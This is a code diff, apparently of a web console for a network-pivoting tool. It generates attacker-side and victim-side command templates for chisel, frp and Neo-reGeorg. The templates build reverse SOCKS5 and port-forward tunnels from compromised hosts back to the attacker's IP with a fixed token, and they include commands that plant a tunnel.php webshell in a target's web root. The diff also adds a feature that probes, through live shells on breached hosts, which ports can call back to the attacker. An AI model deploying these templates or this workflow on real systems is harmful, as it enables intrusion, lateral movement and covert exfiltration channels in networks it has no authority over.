@@ -26,18 +26,18 @@
       relaySocks: (c) => './chisel client ' + c.relayAddr + ':' + c.relayPort + ' R:' + c.bind + ':' + c.lport + ':socks',
     },
     frp: {
-      server: (c) => '# ① 攻击机（' + c.lhost + '）frps\n[common]\nbind_port = ' + c.listen + '\nauthentication_method = token\ntoken = pivothub\n',
-      socks: (c) => '# frpc.ini（' + c.bind + ':' + c.lport + ' → 本段 Socks5）\n[common]\nserver_addr = ' + c.lhost + '\nserver_port = ' + c.listen + '\ntoken = pivothub\n\n[socks5]\ntype = tcp\nremote_port = ' + c.lport + '\nplugin = socks5',
-      portfwd: (c) => '# frpc.ini（' + c.bind + ':' + c.lport + ' → ' + c.thost + ':' + c.tport + '）\n[common]\nserver_addr = ' + c.lhost + '\nserver_port = ' + c.listen + '\ntoken = pivothub\n\n[forward]\ntype = tcp\nlocal_ip = ' + c.thost + '\nlocal_port = ' + c.tport + '\nremote_port = ' + c.lport,
-      relay: (c) => '# frpc.ini（把内网口 ' + c.listen + ' 映射给下层使用）\n[common]\nserver_addr = ' + c.lhost + '\nserver_port = ' + c.listen + '\ntoken = pivothub\n\n[relay]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = ' + c.listen + '\nremote_port = ' + c.listen,
-      relaySocks: (c) => '# 下层 frpc.ini：连到上层内网口 ' + c.relayAddr + ':' + c.relayPort + '\n[common]\nserver_addr = ' + c.relayAddr + '\nserver_port = ' + c.relayPort + '\ntoken = pivothub\n\n[socks5]\ntype = tcp\nremote_port = ' + c.lport + '\nplugin = socks5',
+      server: (c) => '# ① 攻击机（' + c.lhost + '）frps.toml（frp v0.52+ 仅支持 TOML）\nbindAddr = "0.0.0.0"\nbindPort = ' + c.listen + '\nauth.method = "token"\nauth.token = "pivothub"\n\n# 启动：frps -c frps.toml\n',
+      socks: (c) => '# frpc.toml（出口 = 本段 Socks5；攻击机 127.0.0.1:' + c.lport + '）\nserverAddr = "' + c.lhost + '"\nserverPort = ' + c.listen + '\nauth.method = "token"\nauth.token = "pivothub"\nloginFailExit = false\n\n[[proxies]]\nname = "socks5"\ntype = "tcp"\nremotePort = ' + c.lport + '\ntransport.useEncryption = true\ntransport.useCompression = true\n\n[proxies.plugin]\ntype = "socks5"\n\n# 启动：frpc -c frpc.toml',
+      portfwd: (c) => '# frpc.toml（攻击机 127.0.0.1:' + c.lport + ' → ' + c.thost + ':' + c.tport + '）\nserverAddr = "' + c.lhost + '"\nserverPort = ' + c.listen + '\nauth.method = "token"\nauth.token = "pivothub"\n\n[[proxies]]\nname = "portfwd"\ntype = "tcp"\nlocalIP = "' + c.thost + '"\nlocalPort = ' + c.tport + '\nremotePort = ' + c.lport,
+      relay: (c) => '# 跳板 frpc.toml：把攻击机 ' + c.lport + ' 回映射到跳板自身\nserverAddr = "' + c.lhost + '"\nserverPort = ' + c.listen + '\nauth.method = "token"\nauth.token = "pivothub"\n\n[[proxies]]\nname = "relay"\ntype = "tcp"\nlocalIP = "127.0.0.1"\nlocalPort = ' + c.lport + '\nremotePort = ' + c.lport + '\n\n# 跳板另起 frps#2（bindPort = ' + (c.relayPort || c.listen) + '），本层节点连它接入',
+      relaySocks: (c) => '# 下层 frpc.toml：连跳板内网口 ' + c.relayAddr + ':' + c.relayPort + '\nserverAddr = "' + c.relayAddr + '"\nserverPort = ' + c.relayPort + '\nauth.method = "token"\nauth.token = "pivothub"\n\n[[proxies]]\nname = "socks5"\ntype = "tcp"\nremotePort = ' + c.lport + '\n\n[proxies.plugin]\ntype = "socks5"',
     },
     'Neo-reGeorg': {
-      server: (c) => '# ① 攻击机：客户端连到入口马的 tunnel.php\npython3 neoreg.py -k pivothub -u http://' + c.victim + '/upload/tunnel.php -p ' + c.lport + '\n',
-      socks: (c) => '# 靶机侧：tunnel.php 写入 Web 目录即可（Socks 由 neoreg 客户端本地提供）\ncp tunnel.php /var/www/html/upload/tunnel.php && chmod 644 /var/www/html/upload/tunnel.php\n# 验证：curl -s http://' + c.victim + '/upload/tunnel.php',
-      portfwd: (c) => '# Neo-reGeorg 不擅长单端口转发，建议改用 chisel；如需保留可加 -L ' + c.thost + ':' + c.tport,
-      relay: (c) => '# 仅 HTTP 出网时，多级串联需在每层重新放置 tunnel 文件，并用 -r 参数串联',
-      relaySocks: (c) => '# 下层：python3 neoreg.py -k pivothub -u http://' + c.relayAddr + '/upload/tunnel.php -p ' + c.lport,
+      server: (c) => '# ① 攻击机：生成隧道文件 → 上传到目标 Web 目录 → 客户端起本地 Socks5\npython3 neoreg.py generate -k pivothub\n# 目标 Web 目录可访问后：\npython3 neoreg.py -k pivothub -u http://' + c.victim + '/tunnel.php -p ' + c.lport + '\n',
+      socks: (c) => '# 目标侧：把 neoreg_server/tunnel.php 放进 Web 可访问目录即可\n#（Socks5 入口由攻击机上的 neoreg 客户端本地提供）\ncp neoreg_server/tunnel.php /var/www/html/tunnel.php',
+      portfwd: (c) => '# Neo-reGeorg 只提供 Socks5 出口；单端口转发请改用 chisel（或经 Socks5 本地转发）',
+      relay: (c) => '# 仅 HTTP 出网时多级串联：每层各放一份 tunnel 文件，客户端用 -r 串联下层',
+      relaySocks: (c) => 'python3 neoreg.py -k pivothub -u http://' + c.relayAddr + '/tunnel.php -p ' + c.lport,
     },
     nps: {
       server: (c) => '# ① 攻击机 nps 服务端（管理台 8080）\n./nps install && nps start\n',
@@ -92,6 +92,13 @@
         recommend: '',
         alt: '',
         reason: '',
+        shellId: '',              /* 探测所用会话（回连矩阵复用） */
+        templates: [],            /* A6：证据驱动的隧道模板（含两侧可执行命令） */
+        reachablePorts: [],       /* A4：可达回连端口 */
+        matrixRunning: false,     /* A4：回连端口矩阵探测中 */
+        matrix: null,             /* A4：矩阵结果 */
+        matrixPorts: '',          /* 自定义端口集（留空用后端默认） */
+        showTpl: false,
       });
 
       const compose = reactive({
@@ -170,6 +177,7 @@
               S.toast('出网探测未执行：' + ((out && (out.error || out.reason)) || '未知原因'), 'err');
               return;
             }
+            detect.shellId = shell.id;
             (out.probes || []).forEach((p) => {
               const hit = detect.probes.find((x) => x.key === p.key);
               if (hit) {
@@ -185,6 +193,8 @@
             detect.recommend = out.recommend || '';
             detect.alt = out.alt || '';
             detect.reason = out.reason || '';
+            detect.templates = out.templates || [];
+            detect.reachablePorts = out.reachablePorts || [];
             if (!silent) S.toast('探测完成 · 推荐 ' + (out.recommend || '—'), 'ok');
             recommendTool(detect.recommend);
             refreshCmds();
@@ -238,6 +248,35 @@
         if (!silent) S.toast('探测完成 · 推荐 ' + detect.recommend, 'ok');
         recommendTool(detect.recommend);
         refreshCmds();
+      }
+
+      /* 回连端口矩阵（A4）：对攻击机逐端口实测能否回连 —— 直接回答「哪个端口能回连」 */
+      function runMatrix() {
+        const shell = detect.shellId
+          ? { id: detect.shellId }
+          : S.state.shells.find((s) => s.hostId === compose.fromHostId && s.alive);
+        if (!shell) { S.toast('该节点暂无可用 Shell，无法真实探测', 'err'); return; }
+        if (detect.matrixRunning) return;
+        detect.matrixRunning = true;
+        detect.matrix = null;
+        const ports = String(detect.matrixPorts || '').split(/[\s,;]+/)
+          .map((x) => parseInt(x, 10)).filter((n) => n > 0);
+        S.shellProbeCallback(shell.id, { attackIp: compose.attackIp, ports: ports }).then((out) => {
+          detect.matrixRunning = false;
+          if (!out || !out.ok) {
+            S.toast('回连矩阵探测失败：' + ((out && (out.error || out.reason)) || '未知原因'), 'err');
+            return;
+          }
+          detect.matrix = out;
+          detect.reachablePorts = out.reachablePorts || [];
+          S.toast('回连矩阵：' + (out.verdict || '完成')
+            + (detect.reachablePorts.length ? '（可达 ' + detect.reachablePorts.join(',') + '）' : ''), 'ok');
+          S.addEvent('proxy', '回连端口矩阵：' + (out.verdict || ''), {
+            hostId: compose.fromHostId,
+            detail: '对端 ' + (out.attackIp || compose.attackIp || '—')
+              + ' · 可达端口 ' + (detect.reachablePorts.join(',') || '无'),
+          });
+        });
       }
 
       /* ---------- 编排 ---------- */
@@ -545,7 +584,7 @@
         return addrIn(upHost, seg) + ':' + (compose.upstream.listenPort || 1331);
       });
 
-      /* ---------- 代理工具设置（MS4：仅 chisel 已接入，其余为下线状态） ---------- */
+      /* ---------- 代理工具设置（status=online 才可启用：chisel / frp / Neo-reGeorg） ---------- */
       const toolCfg = reactive({ list: [], saving: false });
 
       function enabledToolNames() {
@@ -617,6 +656,7 @@
         openToolSettings, toggleTool, saveToolSettings,
         attackIface, attackSegment, saveAttack,
         runDetect, deploy, genProxychains, genMsf,
+        runMatrix,
         checkAll, check, restart, stop, remove, sendToTerminal, sendHop,
       };
     },
